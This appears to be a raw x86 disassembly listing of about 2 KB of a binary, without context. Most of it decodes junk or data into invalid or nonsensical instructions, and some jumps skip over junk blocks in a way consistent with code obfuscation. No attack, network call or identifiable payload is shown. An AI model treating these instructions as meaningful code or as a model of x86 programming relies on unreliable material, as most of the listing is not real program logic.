  4107ab:	push   ds
  4107ac:	add    eax,0xc9909c2d
  4107b1:	mov    DWORD PTR [edx-0x10],ecx
  4107b4:	pop    edi
  4107b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107b6:	mov    eax,0x97a54866
  4107bb:	fild   QWORD PTR [edi+0x1a]
  4107be:	std    
  4107bf:	xchg   ebx,eax
  4107c0:	sti    
  4107c1:	inc    edx
  4107c2:	pushf  
  4107c3:	in     al,0x89
  4107c5:	pop    edx
  4107c6:	mov    al,ds:0x197ef6d2
  4107cb:	sub    DWORD PTR ds:[esi],edi
  4107ce:	mov    dl,0x1b
  4107d0:	aam    0xba
  4107d2:	in     al,0x20
  4107d4:	xchg   edx,eax
  4107d5:	jbe    0x41083e
  4107d7:	outs   dx,DWORD PTR ds:[esi]
  4107d8:	ja     0x410785
  4107da:	cmp    BYTE PTR [edx],bh
  4107dc:	in     eax,dx
  4107dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107de:	mov    edx,0x1aa3738a
  4107e3:	mov    DWORD PTR [eax],edi
  4107e5:	cmp    BYTE PTR [eax],al
  4107e7:	add    edi,DWORD PTR [edi-0x6a07f184]
  4107ed:	or     esp,DWORD PTR [eax+0x168da6c6]
  4107f3:	mov    eax,ds:0x54b30db8
  4107f8:	cmp    ebx,DWORD PTR [eax-0x4b90ab6e]
  4107fe:	xor    BYTE PTR [ecx+0x2f],ch
  410801:	ret    0x3bd4
  410804:	adc    al,0x72
  410806:	scas   eax,DWORD PTR es:[edi]
  410807:	mov    gs,WORD PTR [edi+0x5e550dc1]
  41080d:	sar    BYTE PTR [edx],0xb
  410810:	hlt    
  410811:	jmp    0xd7e9:0xd133914c
  410818:	add    BYTE PTR [eax],al
  41081a:	add    BYTE PTR [edi+0x27],bl
  41081d:	in     eax,dx
  41081e:	hlt    
  41081f:	std    
  410820:	(bad)  
  410821:	pop    edi
  410822:	scas   eax,DWORD PTR es:[edi]
  410823:	in     al,0x49
  410825:	pop    eax
  410826:	mov    eax,ds:0xd028766
  41082b:	sti    
  41082c:	mov    dl,0x0
  41082e:	add    BYTE PTR [edi-0x2e000000],bh
  410834:	mov    dl,0xa3
  410836:	data16 arpl ax,cx
  410839:	xchg   edi,eax
  41083a:	(bad)
  41083d:	iret   
  41083e:	dec    ebx
  41083f:	pop    esp
  410840:	adc    dh,BYTE PTR [ebx]
  410842:	sbb    eax,0x7cb59ab0
  410847:	dec    edx
  410848:	popf   
  410849:	mov    edx,0x137c7d11
  41084e:	or     dh,bl
  410850:	ficomp DWORD PTR [ebp-0x19]
  410853:	mov    dh,0x81
  410855:	neg    DWORD PTR [ecx-0x3d]
  410858:	ficom  WORD PTR [ebx-0x76]
  41085b:	jle    0x41088e
  41085d:	fsubr  DWORD PTR [ebp-0x767f526f]
  410863:	mov    ds:0x9a61d531,eax
  410868:	jmp    0xbd01:0xe6f629cc
  41086f:	push   ebx
  410870:	xchg   edx,ebx
  410872:	paddb  mm2,mm2
  410875:	pop    ebp
  410876:	daa    
  410877:	(bad)  
  410878:	cmp    al,0x1
  41087a:	ss loopne 0x410839
  41087d:	or     DWORD PTR [ebx+0x538094b3],esi
  410883:	in     al,dx
  410884:	mov    ds:0xe25ef825,eax
  410889:	add    al,0x2d
  41088b:	jb     0x410832
  41088d:	out    0xe0,eax
  41088f:	lods   eax,DWORD PTR ds:[esi]
  410890:	cmp    eax,DWORD PTR [eax+esi*1-0x70]
  410894:	cmc    
  410895:	jns    0x410895
  410897:	cmp    cl,0xd9
  41089a:	xchg   BYTE PTR [ecx+0x22],dl
  41089d:	test   edx,ebx
  41089f:	sub    BYTE PTR [ebx+0x48dd2b3f],dl
  4108a5:	push   edi
  4108a6:	cli    
  4108a7:	inc    edx
  4108a8:	int    0xea
  4108aa:	into   
  4108ab:	out    0xdd,eax
  4108ad:	mov    gs,WORD PTR [edi-0x6e]
  4108b0:	lahf   
  4108b1:	push   ss
  4108b2:	out    dx,eax
  4108b3:	pusha  
  4108b4:	ud0    ebp,esp
  4108b7:	(bad)  
  4108b8:	out    dx,eax
  4108b9:	push   ebp
  4108ba:	dec    ecx
  4108bb:	inc    edi
  4108bc:	adc    ecx,DWORD PTR [eax-0x26]
  4108bf:	jbe    0x41091b
  4108c1:	inc    edx
  4108c2:	sub    BYTE PTR [ecx-0x24],al
  4108c5:	pop    ds
  4108c6:	clc    
  4108c7:	xor    eax,0x1030ecd3
  4108cc:	inc    ebx
  4108cd:	xchg   BYTE PTR ds:0x10503918,dh
  4108d3:	jns    0x410876
  4108d5:	xchg   edi,eax
  4108d6:	(bad)  
  4108d7:	lock ja 0x4108ba
  4108da:	jno    0x410867
  4108dc:	dec    ebx
  4108dd:	add    eax,0x3e5a1f18
  4108e2:	loope  0x410941
  4108e4:	cld    
  4108e5:	push   0xffffffa1
  4108e7:	push   ss
  4108e8:	and    BYTE PTR [esi-0x3b],dh
  4108eb:	jb     0x4108f9
  4108ed:	and    eax,0xd0987dfc
  4108f2:	sub    edx,eax
  4108f4:	mov    eax,DWORD PTR [ebp-0x4]
  4108f7:	imul   edx,eax
  4108fa:	jmp    0x4109d6
  4108ff:	stos   DWORD PTR es:[edi],eax
  410900:	xchg   BYTE PTR [edi-0x4403e],bh
  410906:	out    dx,eax
  410907:	das    
  410908:	lods   al,BYTE PTR ds:[esi]
  410909:	sahf   
  41090a:	xchg   ebp,eax
  41090b:	icebp  
  41090c:	and    al,0x17
  41090e:	jo     0x4108ca
  410910:	mov    bl,0x0
  410912:	add    BYTE PTR [edi-0x4a000000],bh
  410918:	iret   
  410919:	jl     0x41089b
  41091b:	lahf   
  41091c:	popf   
  41091d:	das    
  41091e:	loopne 0x410982
  410920:	lds    ebx,FWORD PTR [esi+esi*1+0x76a3ccf8]
  410927:	add    ah,ah
  410929:	(bad)  
  41092a:	cmovbe ecx,DWORD PTR [ebp+0x25]
  41092e:	mov    eax,0x717e8b63
  410933:	dec    eax
  410934:	outs   dx,BYTE PTR ds:[esi]
  410935:	(bad)  
  410936:	mov    ch,cl
  410938:	lds    ebp,FWORD PTR [ebp+0x4]
  41093b:	pop    ecx
  41093c:	mov    al,0x7f
  41093e:	mov    ds:0x358a1124,al
  410943:	stos   DWORD PTR es:[edi],eax
  410944:	(bad)  
  410945:	outs   dx,DWORD PTR ds:[esi]
  410946:	pop    ecx
  410947:	push   eax
  410948:	cmp    eax,0xd1c010a9
  41094d:	lds    esi,FWORD PTR [eax-0x2f54953a]
  410953:	inc    edx
  410954:	push   0x1e230e1e
  410959:	fisub  DWORD PTR [ebx]
  41095c:	xor    al,0xc4
  41095e:	and    eax,0x3b19c54
  410963:	inc    ecx
  410964:	enter  0x1a81,0xfb
  410968:	dec    ebx
  410969:	dec    edx
  41096a:	and    bh,al
  41096c:	je     0x41098a
  41096e:	sahf   
  41096f:	enter  0xfed0,0xfa
  410973:	or     eax,0x97719831
  410978:	inc    DWORD PTR [ebx-0x5a50536c]
  41097e:	mov    esi,?
  410980:	xor    cl,BYTE PTR [edi]
  410982:	loop   0x410970
  410984:	xchg   DWORD PTR [eax+eax*2-0x531e7462],ecx
  41098b:	pop    ss
  41098c:	jb     0x41096f
  41098e:	shl    BYTE PTR [ebp+0x55c4f852],1
  410994:	and    edi,eax
  410996:	gs (bad) 
  410998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410999:	ja     0x41092c
  41099b:	retf   
  41099c:	ret    
  41099d:	cmp    al,0x3b
  41099f:	in     eax,0x19
  4109a1:	xchg   edx,eax
  4109a2:	jle    0x4109c3
  4109a4:	loop   0x410982
  4109a6:	fdivp  st(5),st
  4109a8:	data16 sub al,0xb2
  4109ab:	loope  0x41096d
  4109ad:	jmp    0x5425:0x1377675d
  4109b4:	or     DWORD PTR [edi+0x66],eax
  4109b7:	ss adc esi,0xa866db0d
  4109be:	jno    0x410972
  4109c0:	dec    ecx
  4109c1:	out    dx,al
  4109c2:	jle    0x4109cd
  4109c4:	repz xchg ebp,eax
  4109c6:	xor    eax,DWORD PTR [esi+0xf834be7]
  4109cc:	aaa    
  4109cd:	and    al,0x83
  4109cf:	mov    al,ds:0x5a25be64
  4109d4:	xlat   BYTE PTR ds:[ebx]
  4109d5:	xchg   DWORD PTR [ebx],eax
  4109d7:	push   ebp
  4109d8:	les    ecx,FWORD PTR [ecx+0x558bc455]
  4109de:	(bad)  
  4109df:	jmp    0x410bb3
  4109e4:	mov    edx,DWORD PTR [ebp-0x38]
  4109e7:	mov    esi,DWORD PTR [ebp-0x34]
  4109ea:	mov    esi,DWORD PTR [ebp-0x30]
  4109ed:	mov    edi,DWORD PTR [ebp-0x2c]
  4109f0:	jmp    0x410acc
  4109f5:	test   al,0x8d
  4109f7:	xchg   edi,eax
  4109f8:	and    esi,DWORD PTR [edi-0x2e7043c5]
  4109fe:	loope  0x410a14
  410a00:	in     al,0xbb
  410a02:	out    0x3e,al
  410a04:	(bad)  
  410a05:	jns    0x4109bb
  410a07:	add    BYTE PTR [eax],al
  410a09:	mov    edi,0x8d000000
  410a0e:	cli    
  410a0f:	lods   eax,DWORD PTR ds:[esi]
  410a10:	mov    ah,0x15
  410a12:	stos   BYTE PTR es:[edi],al
  410a13:	call   0xff64:0x91bc5967
  410a1a:	loopne 0x410a35
  410a1c:	add    eax,0x823328c6
  410a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a22:	sti    
  410a23:	mov    ch,cl
  410a25:	xchg   BYTE PTR ds:0x11b03972,dh
  410a2b:	int    0xf3
  410a2d:	jb     0x410a2c
  410a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a30:	push   ebp
  410a31:	test   DWORD PTR [ebx-0x51f4fc30],esi
  410a37:	cdq    
  410a38:	call   FWORD PTR [eax]
  410a3a:	repnz shr ebx,cl
  410a3d:	pop    eax
  410a3e:	mov    edx,0xffa25c95
  410a43:	shr    BYTE PTR [esi],1
  410a45:	loope  0x410a6c
  410a47:	dec    ebx
  410a48:	in     eax,dx
  410a49:	popf   
  410a4a:	mov    ah,0xda
  410a4c:	and    bh,bl
  410a4e:	sub    BYTE PTR [esi+ecx*4-0x1b78399a],ch
  410a55:	ins    BYTE PTR es:[edi],dx
  410a56:	or     BYTE PTR [ebp-0x104859d6],0x7e
  410a5d:	out    0x46,eax
  410a5f:	and    al,0xc3
  410a61:	pop    es
  410a62:	jg     0x4109f5
  410a64:	fisub  WORD PTR [edx]
  410a66:	outs   dx,BYTE PTR ds:[esi]
  410a67:	mov    ebp,0x8dd78d86
  410a6c:	pop    edx
  410a6d:	push   ebp
  410a6e:	jge    0x410abe
  410a70:	outs   dx,DWORD PTR ds:[esi]
  410a71:	test   BYTE PTR [ebp-0x4f27f98f],bh
  410a77:	adc    al,0xf1
  410a79:	sub    al,0xf6
  410a7b:	imul   DWORD PTR [edx]
  410a7d:	sub    BYTE PTR [ebp+esi*1+0x334d7e9e],cl
  410a84:	mov    ds:0x94b69cb7,al
  410a89:	(bad)  
  410a8a:	mov    ebx,DWORD PTR ds:0x3799424e
  410a90:	aam    0xe2
  410a92:	jg     0x410a7e
  410a94:	mov    edx,0x280c003c
  410a99:	jl     0x410a9f
  410a9b:	mov    ?,WORD PTR [eax+0x5c]
  410a9e:	je     0x410abb
  410aa0:	cli    
  410aa1:	hlt    
  410aa2:	mov    ecx,0xd08c8abf
  410aa7:	lea    esp,[ebp-0x6f2ff5a0]
  410aad:	jmp    0xd6cb:0xfd7def61
  410ab4:	arpl   WORD PTR [edx+eax*8-0x30],cx
  410ab8:	mov    al,ds:0x1ee95031
  410abd:	pushf  
  410abe:	mov    cl,0x2b
  410ac0:	cmc    
  410ac1:	push   edi
  410ac2:	fild   DWORD PTR [edi-0x7e7f4e35]
  410ac8:	mov    esp,0x333d50f9
  410acd:	icebp  
  410ace:	jmp    0x410baa
  410ad3:	adc    al,0x3e
  410ad5:	dec    ebp
  410ad6:	adc    eax,0x3f5c776f
  410adb:	add    BYTE PTR [eax+0x7b],al
  410ade:	in     al,0x40
  410ae0:	mov    al,ds:0xb5380d21
  410ae5:	add    BYTE PTR [eax],al
  410ae7:	mov    edi,0xe3000000
  410aec:	cmp    ebp,DWORD PTR [ebp+0x19]
  410aef:	pop    ds
  410af0:	inc    esp
  410af1:	aas    
  410af2:	or     BYTE PTR [edi],dh
  410af4:	inc    ebx
  410af5:	sbb    BYTE PTR [edi+0x292403bf],dh
  410afb:	test   BYTE PTR [ebx],bh
  410afd:	adc    BYTE PTR [edi],dh
  410aff:	sahf   
  410b00:	push   0x63c4961
  410b05:	sbb    ebp,ebp
  410b07:	pop    esp
  410b08:	(bad)  
  410b09:	div    BYTE PTR [edx]
  410b0b:	xlat   BYTE PTR ds:[ebx]
  410b0c:	pop    esi
  410b0d:	ret    0xa109
  410b10:	(bad)  
  410b11:	aam    0xd
  410b13:	mov    bl,0xb5
  410b15:	out    dx,al
  410b16:	and    al,0x40
  410b18:	or     DWORD PTR [esp+eax*4+0x34f2fa8a],ebp
  410b1f:	mov    dl,0x8f
  410b21:	retf   0x7c44
  410b24:	mov    al,0x2e
  410b26:	mov    ds:0x4be0af71,al
  410b2b:	loope  0x410ad7
  410b2d:	xchg   ecx,ecx
  410b2f:	pop    ebp
  410b30:	bswap  eax
  410b32:	jmp    0xe4fa15de
  410b37:	xor    dh,BYTE PTR [esi+0x757b88c5]
  410b3d:	rcl    DWORD PTR [edi+esi*2-0x7d],1
  410b41:	sbb    ebp,DWORD PTR [edx+0x79]
  410b44:	fsubrp st(5),st
  410b46:	pop    esp
  410b47:	pop    ds
  410b48:	fcmovb st,st(1)
  410b4a:	and    dh,bh
  410b4c:	aam    0x5f
  410b4e:	cwde   
  410b4f:	or     dh,BYTE PTR [ecx+0x29dedfa5]
  410b55:	arpl   WORD PTR [ecx-0x65dab45c],bx
  410b5b:	push   ebx
  410b5c:	cli    
  410b5d:	sub    ch,BYTE PTR [eax+0x45]
  410b60:	rcr    DWORD PTR [ecx+0x4f],1
  410b63:	push   eax
  410b64:	sbb    esi,DWORD PTR [ecx+0x7d]
  410b67:	test   al,0x37
  410b69:	cs (bad) 
  410b6c:	xor    DWORD PTR [edx-0x70355fd0],0xc9c32140
  410b76:	(bad)  
  410b77:	xchg   ecx,eax
  410b78:	bound  ebx,QWORD PTR [edi-0x12]
  410b7b:	out    0x41,eax
  410b7d:	mov    cl,0x30
  410b7f:	call   0x11d53b30
  410b84:	mov    eax,ds:0xb013422
  410b89:	shl    DWORD PTR [ebx],cl
  410b8b:	(bad)  
  410b8c:	lods   al,BYTE PTR ds:[esi]
  410b8d:	es test al,0xd0
  410b90:	mov    ebx,esp
  410b92:	mov    edx,0xe43307f2
  410b97:	sbb    ebp,ebx
  410b99:	aaa    
  410b9a:	ds pop ds
  410b9c:	pop    esi
  410b9d:	rcr    DWORD PTR [ebx+0x71],0x2c
  410ba1:	pop    ds
  410ba2:	jmp    0xaafb:0x683877ba
  410ba9:	enter  0xd133,0x2b
  410bad:	lock sub edx,eax
  410bb0:	imul   edx,esi
  410bb3:	mov    eax,DWORD PTR [ebp-0x40]
  410bb6:	jmp    0x410c92
  410bbb:	xchg   BYTE PTR [ebx],dl
  410bbd:	cmp    al,0xe6
  410bbf:	mov    ebp,0x9973deef
  410bc4:	and    DWORD PTR [eax-0x4554835f],ebp
  410bca:	ret    
  410bcb:	div    DWORD PTR [ebp+0xbf0000]
  410bd1:	add    BYTE PTR [eax],al
  410bd3:	cmp    BYTE PTR [esi-0x75],0x47
  410bd7:	test   esp,edx
  410bd9:	cli    
  410bda:	(bad)  
  410bdb:	xchg   ecx,eax
  410bdc:	pop    ebx
  410bdd:	adc    eax,0x2cdba94b
  410be2:	xor    BYTE PTR [edi+0x435311ff],bl
  410be8:	dec    esp
  410be9:	hlt    
  410bea:	pop    esp
  410beb:	jbe    0x410b94
  410bed:	pushf  
  410bee:	jmp    0x410bbd
  410bf0:	inc    esi
  410bf1:	data16 ja 0x410c28
  410bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf5:	jbe    0x410c38
  410bf7:	fwait
  410bf8:	jmp    0x410c32
  410bfa:	mov    ecx,0x50f9c26d
  410bff:	or     esp,esp
  410c01:	dec    esi
  410c02:	push   esi
  410c03:	and    eax,0xc81f6113
  410c08:	cmp    al,0x86
  410c0a:	rcr    DWORD PTR [ebx],cl
  410c0c:	aaa    
  410c0d:	add    ch,BYTE PTR [edi+0x40]
  410c10:	nop
  410c11:	ins    BYTE PTR es:[edi],dx
  410c12:	lds    ebx,FWORD PTR [ebx+0x72c1b34e]
  410c18:	mov    al,0x4c
  410c1a:	mov    ebx,0xdbb4e55c
  410c1f:	imul   esi,DWORD PTR [edx],0xccaad3f8
  410c25:	std    
  410c26:	loope  0x410c03
  410c28:	sbb    BYTE PTR [esi],bl
  410c2a:	push   edx
  410c2b:	xchg   ebx,eax
  410c2c:	fcmovne st,st(0)
  410c2e:	lods   eax,DWORD PTR ds:[esi]
  410c2f:	ins    DWORD PTR es:[edi],dx
  410c30:	test   al,0x49
  410c32:	call   0xc282:0xd47cac8d
  410c39:	push   ebp
  410c3a:	mov    cl,0x60
  410c3c:	sbb    ecx,DWORD PTR [edx+ebp*4]
  410c3f:	cmp    edi,eax
  410c41:	enter  0xa17f,0xa1
  410c45:	sub    esi,DWORD PTR [ecx]
  410c47:	sbb    al,0x1c
  410c49:	sub    esi,eax
  410c4b:	adc    edi,DWORD PTR [ebx+0x644e1b6d]
  410c51:	jns    0x410ca5
  410c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c54:	daa    
  410c55:	sbb    al,0x47
  410c57:	stc    
  410c58:	mov    dl,0x51
  410c5a:	call   0xf6705b44
  410c5f:	es pop eax
  410c61:	add    al,0xbb
  410c63:	out    dx,al
  410c64:	pop    esi
  410c65:	mov    eax,ds:0x682bac9b
  410c6a:	push   esi
  410c6b:	mov    DWORD PTR [esp+edx*8+0xe],ebx
  410c6f:	into   
  410c70:	in     al,dx
  410c71:	push   eax
  410c72:	mov    ch,0x48
  410c74:	std    
  410c75:	add    DWORD PTR [ebx],ebp
  410c77:	jg     0x410c8c
  410c79:	lock push ecx
  410c7b:	xlat   BYTE PTR ds:[ebx]
  410c7c:	cli    
  410c7d:	ja     0x410c23
  410c7f:	(bad)  
  410c80:	push   eax
  410c81:	idiv   BYTE PTR [ebx+0x4f8db65a]
  410c87:	icebp  
  410c88:	cmp    eax,0x94ec4b4a
  410c8d:	in     eax,0x1b
  410c8f:	out    dx,eax
  410c90:	test   eax,0x2899b924
  410c95:	add    BYTE PTR [eax],al
  410c97:	sub    ecx,eax
  410c99:	add    ecx,DWORD PTR [ebp-0x44]
  410c9c:	jmp    0x410d78
  410ca1:	jne    0x410d20
  410ca3:	and    eax,0x7d5c2d0c
  410ca8:	jge    0x410c8b
  410caa:	(bad)  
  410cab:	imul   eax,ebx,0x39e85ff1
  410cb1:	mov    dh,0xb6
  410cb3:	add    BYTE PTR [eax],al
  410cb5:	mov    edi,0xff000000
  410cba:	and    ebx,edi
  410cbc:	xchg   esp,eax
  410cbd:	mov    ebp,0x7411cb7a
  410cc2:	adc    edi,DWORD PTR [eax+0x73436db6]
  410cc8:	jns    0x410c4a
  410cca:	add    al,0x6f
  410ccc:	mov    bl,dl
  410cce:	xlat   BYTE PTR ds:[ebx]
  410ccf:	in     eax,0x22
  410cd1:	(bad)  [edx+0x13]
  410cd4:	arpl   ax,ax
  410cd6:	pop    edi
  410cd7:	aas    
  410cd8:	jp     0x410c86
  410cda:	adc    al,0xfb
  410cdc:	call   0xbd23:0x880a0e6f
  410ce3:	pop    edi
  410ce4:	mov    edi,0xc763238b
  410ce9:	mov    edi,DWORD PTR [eax+0x58]
  410cec:	jno    0x410c7e
  410cee:	or     al,0x85
  410cf0:	inc    ecx
  410cf1:	mov    eax,0x6f7ad81d
  410cf6:	mov    edx,0x3c0aceed
  410cfb:	sbb    bl,0xca
  410cfe:	shl    BYTE PTR [ebx-0x2e],1
  410d01:	ins    DWORD PTR es:[edi],dx
  410d02:	repnz xchg sp,ax
  410d05:	push   ss
  410d06:	iret   
  410d07:	jp     0x410d0d
  410d09:	sub    al,0x3b
  410d0b:	push   edx
  410d0c:	mov    dl,0x4
  410d0e:	cmp    BYTE PTR [esi+0x18],al
  410d11:	mov    al,ds:0xf7ff1787
  410d16:	fistp  QWORD PTR [eax]
  410d18:	aaa    
  410d19:	mov    al,ds:0xe873d2d8
  410d1e:	dec    eax
  410d1f:	sub    DWORD PTR [eax],0xffffffe7
  410d22:	sbb    BYTE PTR [eax],ah
  410d24:	push   DWORD PTR [edx]
  410d26:	inc    esp
  410d27:	add    eax,DWORD PTR [ecx-0x78b760d7]
  410d2d:	push   eax
  410d2e:	int    0x3f
  410d30:	sbb    al,0x3c
  410d32:	jp     0x410d8e
  410d34:	fs fs mov dh,0x6e
  410d38:	ss mov ebp,0xe44f7d7b
  410d3e:	or     al,0x2d
  410d40:	jnp    0x410d5d
  410d42:	dec    edi
  410d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d44:	nop
  410d45:	out    dx,al
  410d46:	(bad)  
  410d47:	push   es
  410d48:	dec    ebx
  410d49:	mov    eax,0x20f95378
  410d4e:	jg     0x410d97
  410d50:	cmc    
  410d51:	std    
  410d52:	int3   
  410d53:	mov    dl,0x19
  410d55:	push   eax
  410d56:	jmp    0x3870:0x43c351da
  410d5d:	repnz test eax,0x4f274c78
  410d63:	dec    edi
  410d64:	lock mov edi,0xce4a2ec4
  410d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d6b:	addr16 das 
  410d6d:	addr16 ds cmp al,0xb8
  410d71:	xor    al,0xf1
  410d73:	shl    DWORD PTR [esp+edi*4+0x458b69d1],cl
  410d7a:	mov    eax,0x848dc80b
  410d7f:	adc    DWORD PTR [edx-0x7f],esp
  410d82:	(bad)  
  410d83:	dec    DWORD PTR [ecx+0x45c7fc45]
  410d89:	fsubr  QWORD PTR [eax]
  410d8b:	push   eax
  410d8c:	add    BYTE PTR [eax],al
  410d8e:	mov    DWORD PTR [ebp-0x28],0x7e46
  410d95:	jmp    0x410e71
  410d9a:	inc    edi
  410d9b:	sub    al,0xc6
  410d9d:	popa   
  410d9e:	out    dx,eax
  410d9f:	jmp    0x410d88
  410da1:	cs push edx
  410da3:	and    esp,DWORD PTR [esi]
  410da5:	imul   eax,esp,0x75651d86
  410dab:	mov    bh,0x0
  410dad:	add    BYTE PTR [edi+0x6c000000],bh
  410db3:	xor    ebp,DWORD PTR [ebx]
  410db5:	pop    ecx
  410db6:	(bad)  
  410db7:	and    BYTE PTR [eax-0x78],bh
  410dba:	xlat   BYTE PTR ds:[ebx]
  410dbb:	push   cs
  410dbc:	daa    
  410dbd:	push   ss
  410dbe:	and    DWORD PTR ds:0x5b29badd,edi
  410dc4:	(bad)  
  410dc5:	xchg   edi,eax
  410dc6:	ret    
  410dc7:	neg    DWORD PTR [ecx+edx*2]
  410dca:	jg     0x410dff
  410dcc:	dec    ebx
  410dcd:	fild   QWORD PTR [ebp-0xc]
  410dd0:	inc    ebp
  410dd1:	jecxz  0x410dcd
  410dd3:	(bad)  
  410dd4:	xchg   ebp,eax
  410dd5:	mov    ecx,0xd388509c
  410dda:	std    
  410ddb:	call   0x22d8:0x431960e
  410de2:	push   edx
  410de3:	sbb    eax,0x1862e1f1
  410de8:	pusha  
  410de9:	sbb    bh,BYTE PTR [ebp+eiz*2-0x78]
  410ded:	dec    edx
  410dee:	icebp  
  410def:	mov    al,0xee
  410df1:	in     eax,dx
  410df2:	add    al,0x77
  410df4:	mov    DWORD PTR [edi+esi*2-0x3d],edx
  410df8:	dec    edi
  410df9:	jmp    0x410db4
  410dfb:	jo     0x410e5f
  410dfd:	adc    bl,BYTE PTR [edx+0x2cb3950e]
  410e03:	mov    esp,0xbbeecf0a
  410e08:	push   edx
  410e09:	arpl   WORD PTR [ecx-0x24f56243],cx
  410e0f:	push   eax
  410e10:	jle    0x410dfd
  410e12:	cmpxchg dl,dl
  410e15:	jmp    0xd74a933e
  410e1a:	mov    edi,0x9cb04a7
  410e1f:	xchg   esp,eax
  410e20:	sub    dh,ah
  410e22:	inc    edx
  410e23:	cmp    eax,0x80b21ec8
  410e28:	lock jp 0x410e99
  410e2b:	push   ds
  410e2c:	cld    
  410e2d:	add    esi,DWORD PTR [edx+0x4f]
  410e30:	add    DWORD PTR [edx+0x39],0xffffffcc
  410e34:	je     0x410e3f
  410e36:	out    0xb2,eax
  410e38:	mov    bl,0xc2
  410e3a:	rol    BYTE PTR ds:0xd8bf9866,cl
  410e40:	out    dx,eax
  410e41:	adc    bl,BYTE PTR [ebp*1-0x633e27f3]
  410e48:	mov    WORD PTR [edx],ss
  410e4a:	std    
  410e4b:	sbb    ecx,DWORD PTR [eax-0x42]
  410e4e:	lds    esi,FWORD PTR ds:0xb0e41da4
  410e54:	xor    al,0x52
  410e56:	lock xchg ecx,eax
  410e58:	jmp    0x6e37:0xb0cf83ee
  410e5f:	ins    BYTE PTR es:[edi],dx
  410e60:	push   0x444b0f85
  410e65:	sub    bh,BYTE PTR [eax]
  410e67:	adc    al,0x3c
  410e69:	sbb    al,cl
  410e6b:	push   edi
  410e6c:	sub    eax,0x71c20d30
  410e71:	mov    DWORD PTR [ebp-0x40],0xab2
  410e78:	mov    DWORD PTR [ebp-0x3c],0x2097
  410e7f:	mov    DWORD PTR [ebp-0x44],0x921f
  410e86:	jmp    0x410f62
  410e8b:	ficom  WORD PTR ds:0xd5cfd504
  410e91:	fistp  WORD PTR [edi]
  410e93:	mov    bl,0xc0
  410e95:	jecxz  0x410e75
  410e97:	add    eax,DWORD PTR [esi-0x47cb8f9d]
  410e9d:	add    BYTE PTR [eax],al
  410e9f:	mov    edi,0x8a000000
  410ea4:	shr    BYTE PTR [esi],0x14
  410ea7:	sbb    BYTE PTR [edx],dh
  410ea9:	push   es
  410eaa:	inc    edx
  410eab:	(bad)  
  410eac:	gs jecxz 0x410efd
  410eaf:	pop    edi
  410eb0:	dec    ecx
  410eb1:	js     0x410f07
  410eb3:	dec    ecx
  410eb4:	inc    esi
  410eb5:	jne    0x410f0b
  410eb7:	rcl    BYTE PTR [eax-0x72a78f8e],0x21
  410ebe:	dec    esp
  410ebf:	xchg   BYTE PTR [esi-0x77],al
  410ec2:	mov    ah,0x90
  410ec4:	shl    esi,1
  410ec6:	or     eax,DWORD PTR [edi-0x42]
  410ec9:	repnz add eax,0x9ddd4e6d
  410ecf:	jns    0x410e92
  410ed1:	mov    ecx,DWORD PTR [esi-0x38]
  410ed4:	xchg   ebx,eax
  410ed5:	stc    
  410ed6:	sbb    BYTE PTR [ebp+0x6e879a56],dl
  410edc:	push   ebp
  410edd:	daa    
  410ede:	xor    eax,0xec35fda8
  410ee3:	sbb    bl,ah
  410ee5:	or     BYTE PTR [esp+ecx*4],dl
  410ee8:	dec    ebp
  410ee9:	sar    DWORD PTR [ebp+ebx*2-0x74],cl
  410eed:	inc    esi
  410eee:	dec    ecx
  410eef:	jle    0x410eb3
  410ef1:	push   eax
  410ef2:	jg     0x410f38
  410ef4:	aas    
  410ef5:	add    bl,BYTE PTR [esi-0x7fac3863]
  410efb:	test   cl,0xfc
  410efe:	scas   eax,DWORD PTR es:[edi]
  410eff:	inc    edi
  410f00:	adc    BYTE PTR [ebp-0x4559cf16],cl
  410f06:	scas   al,BYTE PTR es:[edi]
  410f07:	loopne 0x410ea0
  410f09:	hlt    
  410f0a:	addr16 push esp
  410f0c:	stos   BYTE PTR es:[edi],al
  410f0d:	clc    
  410f0e:	daa    
  410f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f10:	clc    
  410f11:	sub    BYTE PTR [eax],ch
  410f13:	test   DWORD PTR [eax+0x4356cc62],esi
  410f19:	imul   esi,DWORD PTR [ebx+0x6c59a0b7],0x3252f102
  410f23:	mov    ds:0xa93c9145,eax
  410f28:	or     DWORD PTR [edx+ebp*1+0x68ccd669],ebx
  410f2f:	pop    edi
  410f30:	test   eax,0x92196e43
  410f35:	pop    eax
  410f36:	sar    DWORD PTR ds:0xcb3126df,0x5c
  410f3d:	ins    DWORD PTR es:[edi],dx
  410f3e:	out    0xb2,al
  410f40:	jae    0x410f21
  410f42:	les    esp,FWORD PTR [eax-0x2c1d0432]
  410f48:	mov    WORD PTR [ebp+0xa67eb6],cs
  410f4e:	outs   dx,BYTE PTR ds:[esi]
  410f4f:	mov    al,BYTE PTR [ecx+0xd]
  410f52:	xchg   edx,eax
  410f53:	lock and BYTE PTR [edx],al
  410f56:	cmp    eax,0x11199596
  410f5b:	jns    0x410fcc
  410f5d:	popa   
  410f5e:	loop   0x410f10
  410f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f61:	dec    esp
  410f62:	mov    DWORD PTR [ebp-0x48],0x63f9
  410f69:	jmp    0x411045
  410f6e:	(bad)  
  410f6f:	ins    DWORD PTR es:[edi],dx
  410f70:	out    dx,eax
  410f71:	push   0xffd7eaff
  410f76:	stc    
  410f77:	mov    eax,ds
  410f79:	fisub  WORD PTR [ebx-0xc1be0a0]
  410f7f:	mov    eax,0xbf0000
  410f84:	add    BYTE PTR [eax],al
  410f86:	sub    eax,0xe7e04348
  410f8b:	sub    al,0x3f
  410f8d:	jne    0x410fb1
  410f8f:	mov    ch,0x67
  410f91:	jne    0x410fb5
  410f93:	pop    ebp
  410f94:	add    BYTE PTR [eax+0x3d],dh
  410f97:	pop    es
  410f98:	push   0x438cba5d
  410f9d:	dec    esp
  410f9e:	push   edx
  410f9f:	fwait
  410fa0:	jecxz  0x410f62
